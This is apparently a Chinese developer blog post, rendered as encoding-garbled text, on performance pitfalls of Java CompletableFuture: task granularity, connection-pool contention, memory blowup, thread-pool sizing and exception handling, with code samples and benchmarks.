.hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>ä¸Šå‘¨çš„æŸä¸€å¤©ï¼Œè¿ç»´åŒå­¦æ‰¾åˆ°æˆ‘è¯´ç”Ÿäº§ç¯å¢ƒçš„è®¢å•å¤„ç†æ¥å£å“åº”æ—¶é—´çªç„¶é£™åˆ°äº† 3 ç§’ã€‚</p>
<p>æˆ‘å…ˆè®©åç«¯åŒå­¦å’Œè¿ç»´ä¸€èµ·æŸ¥ç›‘æ§ï¼ŒCPU ä½¿ç”¨ç‡å€’æ˜¯ä¸é«˜ï¼Œçº¿ç¨‹æ± çš„æ´»è·ƒçº¿ç¨‹æ•°å´æ¶¨åˆ°äº† 500 å¤šã€‚</p>
<p>å†çœ‹äº†çœ¼æœ€è¿‘ä¸Šçº¿çš„ä»£ç ï¼Œé‡Œé¢ä¸€æ®µåŸæœ¬ä¸²è¡Œçš„ä»£ç ï¼Œæ”¹æˆäº† <code>CompletableFuture</code> å¹¶è¡Œå¤„ç†ï¼Œæœ¬æ„è‚¯å®šæ˜¯æƒ³å¿«ä¸€ç‚¹ï¼Œç»“æœåè€Œå˜æ…¢äº†ã€‚</p>
<p>è¿™ä¹Ÿä¸æ˜¯ä¸ªä¾‹ã€‚</p>
<p>å¾ˆå¤šæ—¶å€™æˆ‘ä»¬æ‹¿åˆ°ä¸€æ®µä¸²è¡Œä»£ç ï¼Œç¬¬ä¸€ååº”å°±æ˜¯çœ‹èƒ½ä¸èƒ½æ”¹æˆå¹¶è¡Œï¼Œè§‰å¾—å¤šçº¿ç¨‹è·‘èµ·æ¥è‚¯å®šå¿«ã€‚</p>
<p>ä½†ä¸ªåˆ«æƒ…å†µä¸‹ï¼Œæ”¹å®Œä¹‹åä¸ä»…ä¸ä¼šå˜å¿«ï¼Œå¯èƒ½è¿˜ä¼šæ¯”åŸæ¥è¿˜æ…¢ã€‚</p>
<p>é—®é¢˜å‡ºåœ¨å“ªé‡Œï¼Ÿçº¿ç¨‹æ± ä¸å¤Ÿå¤§å—ï¼Ÿè¿˜æ˜¯æœºå™¨é…ç½®å¤ªä½å—ï¼Ÿå…¶å®ä¸ç„¶ã€‚</p>
<p>çœŸæ­£çš„åŸå› ï¼Œå¯èƒ½è¿˜æ˜¯æˆ‘ä»¬ä½¿ç”¨ CompletableFuture çš„å§¿åŠ¿ä¸æ­£ç¡®ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cf49d84b171e481eba7dd320657d9007~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA5Y-q5Y-r54Wk55CD55qE54yr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767922671&amp;x-signature=cBPTmOh3ZRTwNMsyNdvL4r%2FQB4E%3D" alt="fullmetal alchemist ed GIF.gif" loading="lazy"/></p>
<h2 data-id="heading-1">ä»»åŠ¡æ‹†çš„å¤ªç¢ï¼šä¸Šä¸‹æ–‡åˆ‡æ¢åƒæ‰äº†æ‰€æœ‰æ”¶ç›Š</h2>
<p>å‡è®¾ä½ è¦å¤„ç† 1000 ä¸ªè®¢å•å·ï¼Œæ¯ä¸ªè®¢å•å·éœ€è¦è°ƒç”¨ä¸€ä¸ªæ–¹æ³•åšæ ¡éªŒï¼Œå•æ¬¡è°ƒç”¨è€—æ—¶ 0.1 æ¯«ç§’ã€‚ä¸²è¡Œå¤„ç†æ€»å…±éœ€è¦ 100 æ¯«ç§’ã€‚ä½ è§‰å¾—ç”¨ CompletableFuture å¹¶è¡Œå¤„ç†ï¼Œå¼€ 10 ä¸ªçº¿ç¨‹åº”è¯¥èƒ½å¿« 10 å€å§ï¼Ÿ</p>
<p>è®©æˆ‘ä»¬å†™ä¸ªæµ‹è¯•ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">// ä¸²è¡Œå¤„ç†
long <span class="hljs-attr">start</span> = System.nanoTime()<span class="hljs-comment">;</span>
for (String orderId : orderIds) {
    validateOrder(orderId)<span class="hljs-comment">;</span>
}
long <span class="hljs-attr">serialTime</span> = System.nanoTime() - start<span class="hljs-comment">;</span>

// å¹¶è¡Œå¤„ç†
ExecutorService <span class="hljs-attr">executor</span> = Executors.newFixedThreadPool(<span class="hljs-number">10</span>)<span class="hljs-comment">;</span>
<span class="hljs-attr">start</span> = System.nanoTime()<span class="hljs-comment">;</span>
List&lt;CompletableFuture&lt;Void&gt;&gt; <span class="hljs-attr">futures</span> = orderIds.stream()
    .map(orderId -&gt; CompletableFuture.runAsync(
        () -&gt; validateOrder(orderId), executor))
    .collect(Collectors.toList())<span class="hljs-comment">;</span>
CompletableFuture.allOf(futures.toArray(new CompletableFuture<span class="hljs-section">[0]</span>)).join()<span class="hljs-comment">;</span>
long <span class="hljs-attr">parallelTime</span> = System.nanoTime() - start<span class="hljs-comment">;</span>
</code></pre>
<p>ç»“æœä¸²è¡Œç”¨äº† 98 æ¯«ç§’ï¼Œå¹¶è¡Œç”¨äº† 145 æ¯«ç§’ã€‚</p>
<p>ä¸ºä»€ä¹ˆä¼šè¿™æ ·ï¼Ÿ</p>
<p>æ¯æäº¤ä¸€ä¸ª CompletableFutureï¼Œç³»ç»Ÿéƒ½è¦åšä¸€æ¬¡ä»»åŠ¡è°ƒåº¦ï¼Œæ¶‰åŠçº¿ç¨‹å”¤é†’ã€ä¸Šä¸‹æ–‡åˆ‡æ¢ã€CPU ç¼“å­˜å¤±æ•ˆã€‚è¿™äº›å¼€é”€åŠ èµ·æ¥å¯èƒ½å°±è¦å‡ å¾®ç§’ã€‚å½“å•ä¸ªä»»åŠ¡æœ¬èº«åªéœ€è¦ 0.1 æ¯«ç§’æ—¶ï¼Œè°ƒåº¦å¼€é”€å æ¯”å°±å¾ˆé«˜äº†ã€‚1000 ä¸ªä»»åŠ¡å°±æ˜¯ 1000 æ¬¡è°ƒåº¦ï¼Œç´¯ç§¯èµ·æ¥çš„å¼€é”€è¶…è¿‡äº†å¹¶è¡Œå¸¦æ¥çš„æ”¶ç›Šã€‚</p>
<p>æ›´ç¨³å¦¥çš„åšæ³•æ˜¯æŠŠç²’åº¦æ”¶ç²—ï¼Œè®©æ¯ä¸ªä»»åŠ¡è¶³å¤Ÿå¤§ï¼Œè‡³å°‘è¦†ç›–è°ƒåº¦æˆæœ¬ã€‚</p>
<p>æˆ‘ä»¬æ”¹æˆæ¯ 100 ä¸ªè®¢å•å·ä½œä¸ºä¸€æ‰¹ï¼Œæäº¤ä¸€ä¸ª CompletableFutureï¼š</p>
<pre><code class="hljs language-ini" lang="ini">List&lt;CompletableFuture&lt;Void&gt;&gt; <span class="hljs-attr">futures</span> = new ArrayList&lt;&gt;()<span class="hljs-comment">;</span>
for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; orderIds.size(); i += 100) {</span>
    List&lt;String&gt; <span class="hljs-attr">batch</span> = orderIds.subList(i, 
        Math.min(i + 100, orderIds.size()))<span class="hljs-comment">;</span>
    futures.add(CompletableFuture.runAsync(() -&gt; {
        for (String orderId : batch) {
            validateOrder(orderId)<span class="hljs-comment">;</span>
        }
    }, executor))<span class="hljs-comment">;</span>
}
CompletableFuture.allOf(futures.toArray(new CompletableFuture<span class="hljs-section">[0]</span>)).join()<span class="hljs-comment">;</span>
</code></pre>
<p>è¿™æ¬¡åªç”¨äº† 12 æ¯«ç§’ã€‚è°ƒåº¦æ¬¡æ•°ä» 1000 æ¬¡é™åˆ°äº† 10 æ¬¡ï¼Œä¸Šä¸‹æ–‡åˆ‡æ¢çš„å¼€é”€å¤§å¹…å‡å°‘ï¼Œå¹¶è¡Œçš„ä¼˜åŠ¿æ‰çœŸæ­£ä½“ç°å‡ºæ¥ã€‚</p>
<p>è¿™å…¶å®å°±æ˜¯æœ€å¸¸è§çš„ç­–ç•¥â€”â€”åˆ†æ‰¹å¤„ç†æˆ–åˆ†ç‰‡å¤„ç†ã€‚</p>
<p>å½“ç„¶è¿˜æœ‰ä¸€ç‚¹ç»éªŒä¸»ä¹‰ï¼Œå•ä¸ªä»»åŠ¡çš„æ‰§è¡Œæ—¶é—´è‡³å°‘è¦åœ¨ 1 æ¯«ç§’ä»¥ä¸Šï¼Œå¹¶è¡Œæ‰æœ‰æ„ä¹‰ã€‚å¦‚æœä»»åŠ¡æœ¬èº«å¾ˆè½»é‡ï¼Œå°±åº”è¯¥æ‰“åŒ…æˆæ‰¹æ¬¡å†æäº¤ã€‚</p>
<h2 data-id="heading-2">å…±äº«èµ„æºï¼šæ‰€æœ‰çº¿ç¨‹æŒ¤åœ¨åŒä¸€æ‰‡é—¨å‰</h2>
<p>å¹¶è¡Œå¤„ç†æ—¶ï¼Œå¦‚æœå¤šä¸ªçº¿ç¨‹éœ€è¦è®¿é—®åŒä¸€ä¸ªèµ„æºï¼Œè¿™ä¸ªèµ„æºå°±ä¼šæˆä¸ºç“¶é¢ˆã€‚æœ€å¸¸è§çš„å°±æ˜¯<strong>æ•°æ®åº“è¿æ¥æ± </strong>ã€‚</p>
<p>æ¯”æ–¹è¯´ç”¨ CompletableFuture å¹¶è¡ŒæŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯ï¼Œæ¯ä¸ª future éƒ½è¦ä»è¿æ¥æ± æ‹¿ä¸€ä¸ªæ•°æ®åº“è¿æ¥ã€‚è¿æ¥æ± é…ç½®äº† 20 ä¸ªè¿æ¥ï¼Œä½†åŒæ—¶æäº¤äº† 100 ä¸ª CompletableFutureã€‚</p>
<p>ç»“æœå°±æ˜¯ 80 ä¸ªçº¿ç¨‹åœ¨ç­‰å¾…è¿æ¥é‡Šæ”¾ï¼Œç™½ç™½æµªè´¹æ—¶é—´ã€‚</p>
<pre><code class="hljs language-ini" lang="ini">// è¿æ¥æ± åªæœ‰ 20 ä¸ªè¿æ¥
HikariConfig <span class="hljs-attr">config</span> = new HikariConfig()<span class="hljs-comment">;</span>
config.setMaximumPoolSize(20)<span class="hljs-comment">;</span>
DataSource <span class="hljs-attr">dataSource</span> = new HikariDataSource(config)<span class="hljs-comment">;</span>

// åŒæ—¶å‘èµ· 100 ä¸ªæŸ¥è¯¢
ExecutorService <span class="hljs-attr">executor</span> = Executors.newFixedThreadPool(<span class="hljs-number">100</span>)<span class="hljs-comment">;</span>
List&lt;CompletableFuture&lt;User&gt;&gt; <span class="hljs-attr">futures</span> = userIds.stream()
    .map(userId -&gt; CompletableFuture.supplyAsync(() -&gt; {
        try (Connection <span class="hljs-attr">conn</span> = dataSource.getConnection()) {
            return queryUser(conn, userId)<span class="hljs-comment">;</span>
        }
    }, executor))
    .collect(Collectors.toList())<span class="hljs-comment">;</span>
</code></pre>
<p>ç›‘æ§æ˜¾ç¤ºï¼Œå¹³å‡æ¯ä¸ªæŸ¥è¯¢è€—æ—¶ä»ä¸²è¡Œæ—¶çš„ 5 æ¯«ç§’æ¶¨åˆ°äº† 50 æ¯«ç§’ã€‚å¤§éƒ¨åˆ†æ—¶é—´éƒ½èŠ±åœ¨äº†ç­‰å¾…è¿æ¥ä¸Šã€‚</p>
<p>é™¤äº†æ•°æ®åº“è¿æ¥æ± ï¼Œè¿˜æœ‰å¾ˆå¤šè¿™ç§å…¸å‹çš„åœºæ™¯æ¡ˆä¾‹ï¼š</p>
<ul>
<li>é”ä¸åŒæ­¥å—</li>
<li>æ•°æ®åº“è¿æ¥æ± ã€Redis è¿æ¥æ± </li>
<li>HTTP å®¢æˆ·ç«¯è¿æ¥æ± </li>
<li>é™æµå™¨ã€ç†”æ–­å™¨</li>
<li>å•çº¿ç¨‹æ—¥å¿— appendã€å•é˜Ÿåˆ—ç¼“å†²</li>
</ul>
<p>ä¸€èˆ¬æ¥è®²ï¼Œè¿™ç§é—®é¢˜çš„åº”å¯¹æ€è·¯é€šå¸¸æ˜¯ï¼š</p>
<ul>
<li>æŠŠå…±äº«åŒºç¼©å°ï¼ŒæŠŠé”ç²’åº¦å‹ç¼©åˆ°å¿…è¦èŒƒå›´</li>
<li>è®©å¹¶å‘åº¦å—èµ„æºå®¹é‡çº¦æŸï¼Œåˆ«è¶…è¿‡è¿æ¥æ± å’Œä¸‹æ¸¸çš„å¯æ‰¿å—å¹¶å‘</li>
<li>å¯¹ I/O åšéš”ç¦»æ± ï¼Œé¿å…åŒä¸€ä¸ªæ± é‡Œæ—¢è·‘ CPU åˆè·‘é˜»å¡ I/O</li>
</ul>
<p>æœ€ç®€å•çš„æ–¹å¼å°±æ˜¯æŠŠçº¿ç¨‹æ± æ”¹æˆ 20ï¼Œå½“ç„¶è¿˜æœ‰å¦ä¸€ä¸ªæœ´ç´ ä½†æœ‰æ•ˆçš„æ‰‹æ®µï¼Œæ˜¯ç”¨ä¿¡å·é‡æŠŠå¹¶å‘åº¦å¡åœ¨èµ„æºå®¹é‡ä¹‹å†…ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">Semaphore <span class="hljs-attr">semaphore</span> = new Semaphore(<span class="hljs-number">20</span>)<span class="hljs-comment">; // ä¸è¦è¶…è¿‡è¿æ¥æ± æˆ–ä¸‹æ¸¸å¹¶å‘ä¸Šé™</span>
List&lt;CompletableFuture&lt;User&gt;&gt; <span class="hljs-attr">futures</span> = userIds.stream()
    .map(userId -&gt; CompletableFuture.supplyAsync(() -&gt; {
        try {
            semaphore.acquire()<span class="hljs-comment">;</span>
            try (Connection <span class="hljs-attr">conn</span> = dataSource.getConnection()) {
                return queryUser(conn, userId)<span class="hljs-comment">;</span>
            }
        } finally {
            semaphore.release()<span class="hljs-comment">;</span>
        }
    }, executor))
    .collect(Collectors.toList())<span class="hljs-comment">;</span>
</code></pre>
<p>å¦‚æœä½ çš„ä»»åŠ¡éœ€è¦è·å–è¿™äº›èµ„æºï¼Œå¹¶å‘åº¦å°±ä¸èƒ½è®¾å¾—å¤ªé«˜ï¼Œå¦åˆ™å¤§é‡çº¿ç¨‹ä¼šé˜»å¡åœ¨èµ„æºç«äº‰ä¸Šã€‚</p>
<h2 data-id="heading-3">å†…å­˜çˆ†ç‚¸ï¼šä¸€å£æ°”æäº¤åä¸‡ä¸ª Future</h2>
<p>æœ‰ä¸ªå®šæ—¶ä»»åŠ¡éœ€è¦å¤„ç†æ•°æ®åº“é‡Œçš„æ‰€æœ‰å¾…å¤„ç†è®¢å•ï¼Œæ•°é‡å¤§æ¦‚åå‡ ä¸‡ã€‚åç«¯åŒå­¦å†™äº†è¿™æ ·çš„ä»£ç ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">List&lt;Order&gt; <span class="hljs-attr">orders</span> = orderRepository.findAllPending()<span class="hljs-comment">; // 10 ä¸‡æ¡</span>
ExecutorService <span class="hljs-attr">executor</span> = Executors.newFixedThreadPool(<span class="hljs-number">50</span>)<span class="hljs-comment">;</span>

List&lt;CompletableFuture&lt;Void&gt;&gt; <span class="hljs-attr">futures</span> = orders.stream()
    .map(order -&gt; CompletableFuture.runAsync(
        () -&gt; processOrder(order), executor))
    .collect(Collectors.toList())<span class="hljs-comment">;</span>

CompletableFuture.allOf(futures.toArray(new CompletableFuture<span class="hljs-section">[0]</span>)).join()<span class="hljs-comment">;</span>
</code></pre>
<p>è¿™æ®µä»£ç åœ¨æµ‹è¯•ç¯å¢ƒè·‘å¾—å¥½å¥½çš„ï¼Œå› ä¸ºæµ‹è¯•æ•°æ®åªæœ‰å‡ ç™¾æ¡ã€‚ä¸Šäº†ç”Ÿäº§ä¹‹åï¼ˆè‰å°ç­å­æ²¡æœ‰åšå¥½ä»£ç å®¡æŸ¥ ğŸ˜­ï¼‰ï¼ŒJVM ç›´æ¥ OOM äº†ã€‚</p>
<p>é—®é¢˜åœ¨äºè¿™è¡Œä»£ç ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">.collect(Collectors.toList())<span class="hljs-comment">;</span>
</code></pre>
<p>å®ƒä¼šä¸€å£æ°”åˆ›å»º 10 ä¸‡ä¸ª CompletableFuture å¯¹è±¡ï¼Œæ¯ä¸ªå¯¹è±¡å ç”¨å‡ ç™¾å­—èŠ‚åˆ°ä¸Šåƒå­—èŠ‚ä¸ç­‰ã€‚è¿˜æ²¡å¼€å§‹å¤„ç†ï¼Œå…‰æ˜¯è¿™äº› Future å¯¹è±¡å°±å ç”¨äº†å‡ ç™¾ MB å†…å­˜ã€‚åŠ ä¸Šçº¿ç¨‹æ± é˜Ÿåˆ—é‡Œå †ç§¯çš„ä»»åŠ¡å¯¹è±¡ï¼Œå†…å­˜å¾ˆå¿«å°±æ’‘ä¸ä½äº†ã€‚</p>
<p>æ­£ç¡®çš„åšæ³•æ˜¯åˆ†æ‰¹å¤„ç†ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">List&lt;Order&gt; <span class="hljs-attr">orders</span> = orderRepository.findAllPending()<span class="hljs-comment">;</span>
ExecutorService <span class="hljs-attr">executor</span> = Executors.newFixedThreadPool(<span class="hljs-number">50</span>)<span class="hljs-comment">;</span>

int <span class="hljs-attr">batchSize</span> = <span class="hljs-number">1000</span><span class="hljs-comment">;</span>
for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; orders.size(); i += batchSize) {</span>
    List&lt;Order&gt; <span class="hljs-attr">batch</span> = orders.subList(i, 
        Math.min(i + batchSize, orders.size()))<span class="hljs-comment">;</span>
    
    List&lt;CompletableFuture&lt;Void&gt;&gt; <span class="hljs-attr">futures</span> = batch.stream()
        .map(order -&gt; CompletableFuture.runAsync(
            () -&gt; processOrder(order), executor))
        .collect(Collectors.toList())<span class="hljs-comment">;</span>
    
    CompletableFuture.allOf(futures.toArray(new CompletableFuture<span class="hljs-section">[0]</span>)).join()<span class="hljs-comment">;</span>
}
</code></pre>
<p>æ¯æ¬¡åªåˆ›å»º 1000 ä¸ª Futureï¼Œå¤„ç†å®Œä¸€æ‰¹å†å¤„ç†ä¸‹ä¸€æ‰¹ã€‚å†…å­˜å ç”¨ç¨³å®šåœ¨å¯æ§èŒƒå›´å†…ã€‚</p>
<p>è¿™ä¸ªé—®é¢˜çš„æœ¬è´¨æ˜¯ç¼ºå°‘èƒŒå‹æœºåˆ¶ã€‚</p>
<p>ç”Ÿäº§è€…ä¸€è‚¡è„‘åœ°æäº¤ä»»åŠ¡ï¼Œå®Œå…¨ä¸ç®¡æ¶ˆè´¹è€…çš„å¤„ç†èƒ½åŠ›ã€‚å½“ä»»åŠ¡æäº¤é€Ÿåº¦è¿œå¤§äºå¤„ç†é€Ÿåº¦æ—¶ï¼Œæœªå¤„ç†çš„ä»»åŠ¡å°±ä¼šåœ¨å†…å­˜é‡Œå †ç§¯ï¼Œæœ€ç»ˆå¯¼è‡´ OOMã€‚</p>
<h2 data-id="heading-4">çº¿ç¨‹æ± é…ç½®ï¼šä¸æ˜¯è¶Šå¤§è¶Šå¥½</h2>
<p>é‡åˆ°æ€§èƒ½é—®é¢˜æ—¶ï¼Œå¾ˆå¤šäººçš„ç¬¬ä¸€ååº”æ˜¯åŠ å¤§çº¿ç¨‹æ± ã€‚åŸæ¥æ˜¯ 50ï¼Œæ”¹æˆ 100ï¼Œè¿˜æ˜¯æ…¢å°±æ”¹æˆ 200ã€‚ç»“æœå¾€å¾€æ˜¯çº¿ç¨‹è¶Šå¤šè¶Šæ…¢ã€‚</p>
<p>ä»¥å‰åšè¿‡ä¸€ä¸ªå®éªŒï¼Œç”¨ä¸åŒå¤§å°çš„çº¿ç¨‹æ± å¤„ç†åŒä¸€æ‰¹ IO å¯†é›†å‹ä»»åŠ¡ã€‚æ¯ä¸ªä»»åŠ¡éœ€è¦è°ƒç”¨ä¸€ä¸ªå¤–éƒ¨ HTTP æ¥å£ï¼Œå¹³å‡è€—æ—¶ 200 æ¯«ç§’ã€‚ä¸€å…± 1000 ä¸ªä»»åŠ¡ã€‚</p>



































<table><thead><tr><th>çº¿ç¨‹æ•°</th><th>æ€»è€—æ—¶(ç§’)</th><th>CPU ä½¿ç”¨ç‡</th></tr></thead><tbody><tr><td>10</td><td>20.5</td><td>15%</td></tr><tr><td>50</td><td>4.2</td><td>45%</td></tr><tr><td>100</td><td>2.8</td><td>68%</td></tr><tr><td>200</td><td>3.1</td><td>82%</td></tr><tr><td>500</td><td>4.8</td><td>91%</td></tr></tbody></table>
<p>å¯ä»¥çœ‹åˆ°ï¼Œçº¿ç¨‹æ•°ä» 10 å¢åŠ åˆ° 100 æ—¶ï¼Œæ€§èƒ½æŒç»­æå‡ã€‚ä½†è¶…è¿‡ 100 ä¹‹åï¼Œæ€§èƒ½åè€Œä¸‹é™äº†ã€‚è¿™æ˜¯å› ä¸ºçº¿ç¨‹æ•°å¤ªå¤šä¼šå¸¦æ¥å‡ ä¸ªé—®é¢˜ï¼š</p>
<p>çº¿ç¨‹æœ¬èº«è¦å ç”¨å†…å­˜ï¼Œæ¯ä¸ªçº¿ç¨‹çš„æ ˆç©ºé—´é»˜è®¤æ˜¯ 1MBã€‚500 ä¸ªçº¿ç¨‹å°±æ˜¯ 500MBã€‚</p>
<p>çº¿ç¨‹è¶Šå¤šï¼Œæ“ä½œç³»ç»Ÿçš„è°ƒåº¦å¼€é”€è¶Šå¤§ã€‚CPU è¦åœ¨ä¸åŒçº¿ç¨‹ä¹‹é—´é¢‘ç¹åˆ‡æ¢ï¼Œæ¯æ¬¡åˆ‡æ¢éƒ½è¦ä¿å­˜å’Œæ¢å¤ä¸Šä¸‹æ–‡ã€‚</p>
<p>å¯¹äº IO å¯†é›†å‹ä»»åŠ¡ï¼Œç»éªŒå…¬å¼æ˜¯ <code>çº¿ç¨‹æ•°ç­‰äº CPU æ ¸å¿ƒæ•°ä¹˜ä»¥ (1 + IO æ—¶é—´ / CPU æ—¶é—´)</code>ã€‚</p>
<p>å‡è®¾ IO æ—¶é—´æ˜¯ 200 æ¯«ç§’ï¼ŒCPU æ—¶é—´æ˜¯ 1 æ¯«ç§’ï¼Œé‚£ä¹ˆ 8 æ ¸æœºå™¨çš„ç†æƒ³çº¿ç¨‹æ•°æ˜¯ <code> 8 * (1 + 200/1) = 1608</code> ã€‚</p>
<p>ä½†è¿™åªæ˜¯ç†è®ºå€¼ï¼Œå®é™…ä¸Šå¾ˆå°‘éœ€è¦è¿™ä¹ˆå¤šçº¿ç¨‹ã€‚</p>
<p>æ›´å®ç”¨çš„åšæ³•æ˜¯ä»ä¸€ä¸ªåˆç†çš„åˆå§‹å€¼å¼€å§‹ï¼Œæ¯”å¦‚ CPU æ ¸å¿ƒæ•°çš„ 2 åˆ° 4 å€ï¼Œç„¶åé€šè¿‡å‹æµ‹é€æ­¥è°ƒæ•´ï¼Œè§‚å¯Ÿ CPU ä½¿ç”¨ç‡ã€å“åº”æ—¶é—´å’Œååé‡ï¼Œæ‰¾åˆ°æœ€ä½³çš„å¹³è¡¡ç‚¹ã€‚</p>
<p>å¦ä¸€ä¸ªå¸¸è§é”™è¯¯æ˜¯æ··ç”¨çº¿ç¨‹æ± ã€‚æœ‰çš„ä»£ç é‡Œåˆ›å»ºäº†å¤šä¸ª ExecutorServiceï¼Œæ¯ä¸ªåœ°æ–¹éƒ½ç”¨ newFixedThreadPool(50)ã€‚</p>
<p>å®é™…è¿è¡Œæ—¶å¯èƒ½æœ‰ 5 ä¸ªè¿™æ ·çš„çº¿ç¨‹æ± ï¼Œæ€»å…± 250 ä¸ªçº¿ç¨‹åœ¨è·‘ã€‚æ¯ä¸ªçº¿ç¨‹æ± å•ç‹¬çœ‹éƒ½ä¸å¤§ï¼Œåˆåœ¨ä¸€èµ·å°±è¶…è´Ÿè·äº†ã€‚</p>
<p>æœ€å¥½æ˜¯åœ¨åº”ç”¨å¯åŠ¨æ—¶åˆ›å»ºä¸€ä¸ªå…¨å±€çš„çº¿ç¨‹æ± ï¼Œæ‰€æœ‰ CompletableFuture å…±ç”¨è¿™ä¸€ä¸ªã€‚</p>
<p>å¦‚æœç¡®å®éœ€è¦éš”ç¦»ï¼Œä¹Ÿåº”è¯¥ä»”ç»†è§„åˆ’å„ä¸ªçº¿ç¨‹æ± çš„å¤§å°ï¼Œç¡®ä¿æ€»æ•°å¯æ§ã€‚</p>
<h2 data-id="heading-5">å¼‚å¸¸å¤„ç†ï¼šä¸€ä¸ªä»»åŠ¡æŒ‚äº†ï¼Œå…¶ä»–ä»»åŠ¡ä¹Ÿç™½è·‘</h2>
<p>CompletableFuture æœ‰ä¸ªç‰¹ç‚¹ï¼Œå¦‚æœå…¶ä¸­ä¸€ä¸ªä»»åŠ¡æŠ›å‡ºå¼‚å¸¸ï¼Œè°ƒç”¨ allOf().join() æ—¶ä¼šç«‹å³æŠ›å‡ºå¼‚å¸¸ï¼Œä½†å…¶ä»–ä»»åŠ¡ä¸ä¼šåœæ­¢ï¼Œå®ƒä»¬ä¼šç»§ç»­åœ¨åå°æ‰§è¡Œå®Œã€‚</p>
<pre><code class="hljs language-scss" lang="scss">List&lt;CompletableFuture&lt;Void&gt;&gt; futures = Arrays<span class="hljs-selector-class">.asList</span>(
    CompletableFuture.runAsync(() -&gt; <span class="hljs-built_in">task1</span>()),
    CompletableFuture<span class="hljs-selector-class">.runAsync</span>(() -&gt; { throw new <span class="hljs-built_in">RuntimeException</span>(); }),
    CompletableFuture<span class="hljs-selector-class">.runAsync</span>(() -&gt; <span class="hljs-built_in">task3</span>())
);

try {
    CompletableFuture<span class="hljs-selector-class">.allOf</span>(futures.toArray(new CompletableFuture[<span class="hljs-number">0</span>]))<span class="hljs-selector-class">.join</span>();
} catch (Exception e) {
    <span class="hljs-comment">// è¿›å…¥è¿™é‡Œæ—¶ï¼Œtask1 å’Œ task3 å¯èƒ½è¿˜åœ¨æ‰§è¡Œ</span>
}
</code></pre>
<p>å¦‚æœä½ çš„ä»»åŠ¡ä¹‹é—´æœ‰ä¾èµ–å…³ç³»ï¼Œè¿™ç§è¡Œä¸ºä¼šå¯¼è‡´èµ„æºæµªè´¹ã€‚æ¯”å¦‚ç¬¬ä¸€æ­¥æŸ¥è¯¢è®¢å•å¤±è´¥äº†ï¼Œåé¢çš„è®¡ç®—ä»·æ ¼ã€æ›´æ–°åº“å­˜éƒ½æ²¡æœ‰æ„ä¹‰ï¼Œä½†å®ƒä»¬è¿˜åœ¨ç»§ç»­è·‘ã€‚</p>
<p>æ›´ç³Ÿç³•çš„æƒ…å†µæ˜¯ï¼Œå¦‚æœæ²¡æœ‰æ­£ç¡®å¤„ç†å¼‚å¸¸ï¼Œæœ‰äº›ä»»åŠ¡å¯èƒ½ä¼šæ°¸è¿œå¡ä½ã€‚æ¯”å¦‚ä»»åŠ¡å†…éƒ¨è·å–äº†é”ä½†æ²¡æœ‰åœ¨ finally é‡Œé‡Šæ”¾ï¼ŒæŠ›å‡ºå¼‚å¸¸åé”å°±æ°¸è¿œä¸ä¼šé‡Šæ”¾äº†ã€‚</p>
<p>å»ºè®®æ¯ä¸ªä»»åŠ¡éƒ½ç”¨ exceptionally æˆ– handle æ–¹æ³•æ•è·å¼‚å¸¸ï¼š</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">List</span>&lt;<span class="hljs-selector-tag">CompletableFuture</span>&lt;<span class="hljs-selector-tag">Result</span>&gt;&gt; <span class="hljs-selector-tag">futures</span> = <span class="hljs-selector-tag">tasks</span><span class="hljs-selector-class">.stream</span>()
    <span class="hljs-selector-class">.map</span>(task -&gt; CompletableFuture.<span class="hljs-built_in">supplyAsync</span>(() -&gt; task.<span class="hljs-built_in">execute</span>())
        .<span class="hljs-built_in">exceptionally</span>(ex -&gt; {
            log.<span class="hljs-built_in">error</span>(<span class="hljs-string">"Task failed"</span>, ex);
            return Result.<span class="hljs-built_in">failure</span>(ex);
        }))
    <span class="hljs-selector-class">.collect</span>(Collectors.<span class="hljs-built_in">toList</span>());

<span class="hljs-selector-tag">List</span>&lt;<span class="hljs-selector-tag">Result</span>&gt; <span class="hljs-selector-tag">results</span> = <span class="hljs-selector-tag">CompletableFuture</span><span class="hljs-selector-class">.allOf</span>(
    futures.<span class="hljs-built_in">toArray</span>(new CompletableFuture[<span class="hljs-number">0</span>]))
    <span class="hljs-selector-class">.thenApply</span>(v -&gt; futures.<span class="hljs-built_in">stream</span>()
        .<span class="hljs-built_in">map</span>(<span class="hljs-attribute">CompletableFuture</span>::join)
        .<span class="hljs-built_in">collect</span>(Collectors.<span class="hljs-built_in">toList</span>()))
    <span class="hljs-selector-class">.join</span>();
</code></pre>
<p>è¿™æ ·å¯ä»¥ç¡®ä¿å¼‚å¸¸è¢«æ­£ç¡®è®°å½•ï¼Œè€Œä¸”ä¸ä¼šä¸­æ–­å…¶ä»–ä»»åŠ¡ã€‚æœ€åæ”¶é›†ç»“æœæ—¶ï¼Œå¯ä»¥æ£€æŸ¥æ¯ä¸ª Result æ˜¯æˆåŠŸè¿˜æ˜¯å¤±è´¥ï¼Œåšç›¸åº”çš„å¤„ç†ã€‚</p>
<h2 data-id="heading-6">æ€§èƒ½æµ‹è¯•ï¼šçœ‹æ¸…å¹¶å‘åº¦æ›²çº¿</h2>
